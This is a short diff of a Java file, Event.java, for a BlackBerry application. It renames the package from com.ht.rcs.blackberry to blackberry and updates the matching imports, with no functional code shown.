@@ -5,16 +5,16 @@
  * File         : Event.java
  * Created      : 26-mar-2010
  * *************************************************/
-package com.ht.rcs.blackberry.event;
+package blackberry.event;
 
 import net.rim.device.api.system.Application;
 
-import com.ht.rcs.blackberry.Status;
-import com.ht.rcs.blackberry.action.Action;
-import com.ht.rcs.blackberry.threadpool.TimerJob;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Utils;
+import blackberry.Status;
+import blackberry.action.Action;
+import blackberry.threadpool.TimerJob;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
+import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
